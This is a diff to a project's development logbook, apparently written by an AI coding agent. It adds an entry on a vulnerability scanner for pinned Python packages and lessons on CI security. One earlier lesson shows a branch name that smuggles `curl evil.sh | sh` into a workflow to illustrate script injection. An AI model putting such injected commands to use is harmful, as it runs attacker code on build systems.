@@ -803,3 +803,23 @@
 2. **This attack really happened.** In March 2025 the popular `tj-actions/changed-files` action was hijacked and its tags moved to code that printed secrets into public CI logs. Workflows pinned by hash weren't affected.
 3. **Give tools the least access that works.** Our CI only needs to read the code, so its token is read-only and isn't left on disk afterwards. If something in CI ever goes wrong, there's less it can do.
 4. **`${{ }}` is copy-paste, not a variable.** GitHub pastes the value into the script *before* it runs, so a branch named `x"; curl evil.sh | sh; "` becomes part of your command. Putting it in `env:` makes it plain data.
+
+## 2026-11-24 (UTC): Checking our pinned packages for known security holes, and the first one it found (0.5.48)
+
+**Why this, why now.** PR #5 had green CI and no merge conflicts (it's waiting on your review, which is the "blocked" GitHub shows). The GPU prototype's open items need the rig or your decisions. The highest unfinished item that needed neither was in Phase 4: "Scan locked packages for known vulnerabilities." Two sessions ago we pinned every package to one exact version; this checks whether any of those exact versions is known to be broken.
+
+**Shipped**
+- **`python -m app.vuln_check`.** For each of the 32 locked packages it asks PyPI (the Python package index) about that exact version. PyPI's answer includes the known security problems for it, taken from the OSV database (the same source the popular `pip-audit` tool uses). It only sends package names and versions, and changes nothing.
+  - One problem often has 2-3 names (a GitHub `GHSA-...` id, a Python `PYSEC-...` id, a `CVE-...` number). They're merged and shown once, with the version that fixes it.
+  - If PyPI can't be reached, doesn't know the version, or answers about something else, that package **fails**. "I couldn't check" is never treated as "clean".
+- **`prototype/vuln-exceptions.json`** (empty). If one day a problem can't be fixed right away, a person can accept it for now: which package, which problem, a sentence on why it can't hurt us, the review date and an end date at most 90 days later. On the end date it fails again so it gets looked at.
+- **New GitHub workflow `vuln-check`** runs it when the lock changes, **every Monday**, and by hand (Actions > vuln-check > Run workflow). If a Monday run fails, GitHub emails you. It's separate from the main CI so a problem published about an old package doesn't block unrelated work.
+- **It found a real one on its first run.** `pytest` 8.4.2 (the tool that runs our tests) has CVE-2025-71176: on a computer shared by several users, another user could mess with pytest's temporary folders. Low risk for us (test-only, one-user CI), but the fix was easy, so I raised it to `pytest` 9.2.0 (released 2026-10-27, so it passes our 7-day waiting rule) and re-made the lock changing only pytest. Second run: 32 of 32 clean.
+- **Proof.** 45 new tests, **870 total, all passing** on Python 3.11 (what CI uses) and 3.13, installed from the new lock with hash checking. The dependency, license, workflow, logbook and site checks all still pass. I broke the checker 17 ways on purpose (stop merging duplicate ids, treat "couldn't reach PyPI" as a pass, ignore end dates, accept an answer about the wrong version, allow 1-year exceptions, count withdrawn reports, no retry, follow a redirect to another site, case-sensitive ids, an exception for one package excusing another, ...). 16 were caught at once; one (not escaping odd characters in the web address) slipped past a weak test, so I tightened the test and now it's caught.
+- **Honest limits:** it only knows problems someone has found and published, so a pass means "nothing known today", not "safe". It covers the Python packages only, not llama.cpp, the GPU driver or the operating system. The workflow first runs after this is merged.
+
+**What you learned**
+1. **Pinning and scanning are two halves.** Pinning makes sure you get the same files every time. Scanning tells you when those same files turn out to have a hole. Without scanning, a pin can keep you on a bad version forever.
+2. **A CVE is a public ID for one security problem** (like a case number). The same problem often also gets a GitHub id and a Python id, which is why the tool merges them.
+3. **"Couldn't check" must never look like "all clear".** A scanner that quietly passes when the network is down gives you false comfort exactly when you can't see anything.
+4. **Exceptions should expire.** "We'll accept this for now" turns into "forever" unless something forces a second look; the 90-day end date is that something.
